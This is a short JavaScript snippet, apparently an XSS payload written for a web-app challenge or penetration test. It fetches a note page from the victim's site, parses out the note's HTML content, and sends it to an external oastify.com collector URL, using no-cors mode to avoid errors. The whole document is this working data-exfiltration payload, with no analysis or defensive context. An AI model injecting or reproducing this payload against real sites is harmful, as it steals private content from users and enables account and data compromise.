fetch('/notes/1').then(r=>r.text()).then(d=>{
  let content = (new DOMParser()).parseFromString(d,'text/html').querySelector('div.bg-white.shadow-md.rounded-lg.p-6').innerHTML;
  // Use fetch with no-cors mode
  fetch('https://66an85cubmljzetr1e0ebgqzuq0hoec3.oastify.com/collect?data='+encodeURIComponent(content), {
    method: 'GET',
    mode: 'no-cors'  // This prevents CORS errors
  });
})
